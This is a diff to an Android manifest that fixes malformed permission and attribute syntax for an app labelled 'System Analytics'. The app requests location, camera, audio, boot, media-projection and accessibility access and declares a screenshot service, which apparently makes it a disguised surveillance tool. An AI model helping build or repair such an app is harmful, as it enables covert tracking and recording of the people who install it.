@@ -1,17 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
-    
+
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android.name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     
-    <!-- NEW PERMISSIONS REQUIRED FOR FOREGROUND SERVICE -->
+    <!-- THESE ARE THE CORRECTED PERMISSIONS -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
@@ -25,11 +25,10 @@
         android:icon="@mipmap/ic_launcher"
         android:label="System Analytics"
         android:roundIcon="@mipmap/ic_launcher_round"
-        android.supportsRtl="true"
+        android:supportsRtl="true"
         android:theme="@style/Theme.Chimera"
         tools:targetApi="31">
 
-        <!-- MainActivity, old CoreService, FCMService, BootReceiver, CameraActivity are unchanged -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -51,7 +50,6 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- NEW FOREGROUND SERVICE DECLARATION -->
         <service
             android:name=".ScreenshotService"
             android:enabled="true"
